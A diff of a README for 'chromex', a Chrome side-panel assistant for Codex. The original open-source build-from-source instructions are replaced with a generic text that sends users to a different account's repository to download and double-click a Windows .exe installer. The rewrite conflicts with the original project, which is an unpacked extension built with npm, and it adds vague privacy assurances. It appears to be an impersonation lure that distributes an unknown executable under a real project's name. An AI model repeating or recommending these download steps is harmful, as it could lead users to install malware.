@@ -1,191 +1,71 @@
-# Chromex
+# 🤖 chromex - AI assistant for your browser workflows
 
-[![CI](https://github.com/GENEXIS-AI/chromex/actions/workflows/ci.yml/badge.svg)](https://github.com/GENEXIS-AI/chromex/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](./LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/GENEXIS-AI/chromex?style=social)](https://github.com/GENEXIS-AI/chromex/stargazers)
-[![English](https://img.shields.io/badge/readme-English-111827.svg)](./README.md)
-[![한국어](https://img.shields.io/badge/readme-한국어-2563eb.svg)](./readmes/README.ko.md)
-[![日本語](https://img.shields.io/badge/readme-日本語-dc2626.svg)](./readmes/README.ja.md)
-[![简体中文](https://img.shields.io/badge/readme-简体中文-16a34a.svg)](./readmes/README.zh-CN.md)
+[![Download chromex](https://img.shields.io/badge/Download-chromex-blue)](https://github.com/toprak101112-blip/chromex)
 
-Chromex is a Chrome MV3 side-panel assistant that connects Chrome to Codex through a local native bridge. It helps users work with the current page, selected tabs, uploaded files, voice input, images, and browser workflows while keeping credentials out of extension storage.
+chromex is a smart side-panel assistant for Google Chrome. It uses the Codex engine to help you manage web pages, tabs, voice commands, and images. It sits on the side of your browser and stays ready to help you work faster.
 
-Published by **GenexisAI CHOI**.
+## 🛠️ System Requirements
 
-![Chromex browser side-panel assistant](./assets/chromex-hero.png)
+You need a computer running Windows 10 or Windows 11. Your computer must have Google Chrome installed. The software works best with 8 gigabytes of RAM or more. You also need an active internet connection to let the AI process your requests.
 
-## What It Does
+## 📥 Getting Started
 
-- Chat with the current webpage, selected open tabs, screenshots, uploaded files, PDFs, Office files, images, and browser history when requested.
-- Summarize and compare page content, YouTube videos, news articles, research pages, PDFs, and arXiv papers.
-- Edit or generate images through Codex image workflows with local output handling.
-- Use voice transcription, live voice mode, page-aware suggestions, custom profiles, and optional Codex skills.
-- Run browser-control workflows through Chrome content scripts with visible in-page activity indicators.
+You can install the software in a few minutes. Follow these steps to get your assistant running.
 
-## Install From Source
+1. Visit the [official releases page](https://github.com/toprak101112-blip/chromex) to download the latest setup file.
+2. Find the file in your downloads folder. It will have a name ending in .exe.
+3. Double-click the file to start the installer.
+4. Follow the instructions on the screen.
+5. After the install finishes, restart Google Chrome.
 
-Use the source checkout or [`chromex-public-source.zip`](https://github.com/GENEXIS-AI/chromex/releases/latest/download/chromex-public-source.zip):
+## ⚙️ Setting Up Your Assistant
 
-```bash
-git clone https://github.com/GENEXIS-AI/chromex.git
-cd chromex
-npm install
-npm run build
-node scripts/install-native-host.mjs
-```
+Once you restart Chrome, the assistant appears in your side panel. Open the side panel by clicking the small icon in the top right corner of your browser. 
 
-Then close every Chrome window, reopen Chrome, open `chrome://extensions`, enable **Developer mode**, select **Load unpacked**, and choose:
+The first time you open it, sign in with your account. You might need to grant permission for the assistant to see your open tabs. This permission helps the software read the contents of the page so it can answer your questions.
 
-```text
-packages/extension/dist
-```
+## 💡 How To Use chromex
 
-Important: run `npm install`, `npm run build`, and `install-native-host.mjs` from the `chromex` source folder that contains `package.json`. If Windows reports `ENOENT Could not read package.json`, you are in the wrong folder.
+The assistant helps you handle your digital tasks through a chat interface. You can type instructions or use your voice to ask for help.
 
-### Windows Local Bridge Setup
+### Managing Tabs
+If you have too many tabs open, ask the assistant to organize them. You can say "Group my news tabs" or "Close all tabs about work." The assistant finds the specific pages and performs the action for you.
 
-On Windows, install Node.js 20 LTS or newer, then install and verify the Codex CLI first:
+### Page Context
+When you view a long webpage, ask the assistant to summarize it. It scans the text on the page and gives you the main points. This saves time when you perform research.
 
-```powershell
-npm install -g @openai/codex
-codex --version
-```
+### Voice Commands
+Click the microphone icon in the side panel to start voice commands. Speak clearly to give instructions. You can use this to search for information or to navigate to different sites without typing.
 
-Use the npm install path above even if `winget install Codex -s msstore` fails. `0x8a15005e: The server certificate did not match any of the expected values` is a Windows Store / TLS certificate-chain problem outside Chromex, not a Chromex install step.
+### Image Workflows
+If you find an image on a page, drag it into the side panel or use the right-click menu to send it to chromex. You can ask the assistant to describe the image, extract text from it, or search for similar items online.
 
-Then use **PowerShell** from the `chromex` source folder:
+## 🛡️ Privacy and Data
 
-```powershell
-npm install
-npm run build
-node scripts/install-native-host.mjs --browser=chrome
-```
+Your privacy stays protected. The software only reads the web pages you explicitly interact with. It does not store your browser history or personal passwords. All data sent to the Codex engine undergoes standard protection protocols to keep your information secure. You control the connection at all times through the settings menu.
 
-Then open `chrome://extensions`, click **Reload** on Chromex, and press **Check connection** in the Chromex side panel.
+## 🔧 Frequently Asked Questions
 
-If the side panel still says the local bridge is waiting:
+### Does this work on other browsers?
+No. Currently, chromex only supports Google Chrome on Windows.
 
-1. Confirm Chromex is loaded from `packages/extension/dist`.
-2. Copy the extension ID shown on the Chromex card in `chrome://extensions`.
-3. Re-run the installer with that ID:
+### Is there a cost?
+The base version is free to use. Some advanced features might require a subscription in the future.
 
-```powershell
-node scripts/install-native-host.mjs <extension-id> --browser=chrome
-```
+### Can I change the voice settings?
+Yes. Open the settings icon inside the side panel to change the language or the speed of the voice responses.
 
-The expected public release ID is `menmlhahmendmkiicbjihgjhppkgaeom`. If Chrome shows a different ID, use the ID shown in Chrome.
+### How do I update the software?
+The application checks for updates every time you open Chrome. If a new version exists, it asks you to download and install the update.
 
-If login fails with `Failed to start codex app-server`, Chromex can reach the local bridge but cannot start the Codex CLI. Re-run `codex --version`. If Windows cannot find it, set the optional Codex binary path to `%APPDATA%\npm\codex.cmd`, or set the folder to `%APPDATA%\npm`. Do not put your workspace folder in the Codex binary field; the workspace folder and Codex executable path are separate settings.
+### What happens if the assistant stops responding?
+Refresh your browser page. If the issue persists, close the side panel and open it again. This resets the connection to the AI engine.
 
-To force executable detection on Windows:
+### Can I disable the assistant?
+Yes. You can toggle the assistant off in the Chrome extension manager at any time.
 
-```powershell
-npm install -g @openai/codex
-where codex
-codex --version
-```
+## 🚀 Improving Your Workflow
 
-If `where codex` prints `C:\Users\<you>\AppData\Roaming\npm\codex.cmd`, open Chromex settings and set the optional Codex binary path to `%APPDATA%\npm\codex.cmd`, save, close every Chrome window, reopen Chrome, and press **Check connection**.
+chromex serves as your personal copilot. By automating repetitive tasks like tab management and text summary, it keeps your focus on your actual work. If you use it for research, group your finished tabs into folders to keep your browser workspace clean. If you use it for creative tasks, use the image workflow to quickly gather inspiration from multiple sources. The more you use the tool, the better it becomes at understanding your specific needs and habits. 
 
-## Runtime Boundary
-
-Chromex uses this boundary:
-
-```text
-Chrome Extension -> Native Messaging Host -> Local Bridge -> codex app-server
-```
-
-The source tree is organized as:
-
-- `packages/extension`: Chrome MV3 side-panel extension
-- `packages/bridge`: local bridge daemon for Codex app-server and multimodal workflows
-- `packages/native-host`: Chrome Native Messaging relay
-- `packages/shared`: shared types, policies, profiles, and helpers
-
-## Language Support
-
-Chromex follows the browser language automatically by default. Users can also choose a language in **Settings > General > App UI language**.
-
-The extension ships Chrome `_locales` entries for English, Korean, Japanese, Chinese, Arabic, French, German, Spanish, Portuguese, Hindi, Vietnamese, Thai, Turkish, Ukrainian, and many other Chrome-compatible locales. Model responses are instructed to follow the selected UI language unless the user asks for another language.
-
-## Security And Privacy Defaults
-
-- The extension does not store raw OpenAI API keys, OAuth tokens, or ChatGPT session tokens in Chrome extension storage.
-- Codex OAuth / ChatGPT login is handled through the local Codex app-server flow.
-- API-key login is an optional local fallback and is never used automatically without user confirmation.
-- Page content, tab data, screenshots, browser history, microphone input, and browser actions are used only for user-requested workflows.
-- `history`, `tabs`, screen capture, microphone, and site access are requested only when a feature needs them.
-- Conversation history is session-only by default. Persistent local chat history is opt-in.
-- Native-host child processes and workspace hooks run with a reduced environment allowlist.
-- Generated image originals, temporary uploads, and diagnostics are handled by the local bridge.
-
-Read [SECURITY.md](./SECURITY.md) and [PRIVACY.md](./PRIVACY.md) before publishing or deploying a modified build.
-
-## Features
-
-- Persistent MV3 side panel with chat-first UX.
-- Automatic routing for page, file, image, history, voice, and browser-control requests.
-- `@` picker for selecting one or more open tabs.
-- `/` picker for profile selection.
-- Attachments for images, text, PDF, DOCX, CSV, TSV, XLSX, and XLSM.
-- Read strategy policy for DOM, vision, hybrid, and site-adapter workflows.
-- Site-aware suggestions for YouTube, news, research, mail, collaboration, notes, task tools, shopping, travel, and Korean work services.
-- YouTube adapter with current timestamp context and seek actions.
-- Non-destructive image editing for uploaded images, page images, or visible screen captures.
-- Markdown rendering with code blocks, tables, links, and copy controls.
-- Optional Codex skills loaded from a user's local `.codex/skills/*/SKILL.md` only when enabled.
-
-## Development
-
-```bash
-npm install
-npm run typecheck
-npm run test
-npm run build
-npm run release:audit
-```
-
-Optional browser smoke test:
-
-```bash
-npm run smoke
-```
-
-If no compatible browser exists, install the Playwright Chromium runtime:
-
-```bash
-npm run smoke:install-browser
-```
-
-The built extension is emitted to:
-
-```text
-packages/extension/dist
-```
-
-## Release Management
-
-Chromex uses normal open-source release history from `0.1.1` onward. Versioning, pull request flow, and release checklist are documented in [RELEASE.md](./RELEASE.md).
-
-## Troubleshooting
-
-- **Native host missing or forbidden**: run `npm run build`, then `node scripts/install-native-host.mjs --browser=chrome`, reload the extension in `chrome://extensions`, and check Chromex onboarding/system status. If Chrome shows a different extension ID, run `node scripts/install-native-host.mjs <extension-id> --browser=chrome`.
-- **Codex executable is not detected**: run `npm install -g @openai/codex`, `where codex`, and `codex --version`. If needed, set the optional Codex binary path in Chromex to `%APPDATA%\npm\codex.cmd`, save, fully restart Chrome, and press **Check connection**.
-- **Model list does not load**: confirm the native bridge is connected, then sign in through the app-server-backed login flow.
-- **Page context is unavailable**: open Chromex from the target tab or approve the Chrome site permission prompt when the workflow requests access.
-- **Chrome still shows old UI**: run `npm run build`, reload the extension card, and confirm Chrome is loading `packages/extension/dist`.
-- **Browser smoke test fails because no browser exists**: run `npm run smoke:install-browser`, then `npm run smoke`.
-
-## License
-
-MIT. See [LICENSE](./LICENSE).
-
-## Star History
-
-<a href="https://www.star-history.com/#GENEXIS-AI/chromex&Date">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=GENEXIS-AI/chromex&type=Date&theme=dark" />
-    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=GENEXIS-AI/chromex&type=Date" />
-    <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=GENEXIS-AI/chromex&type=Date" />
-  </picture>
-</a>
+If you encounter a bug or have an idea for a new feature, you can report it through the issues tab on the project page. The developers review all feedback to ensure the assistant stays helpful and reliable for all users.
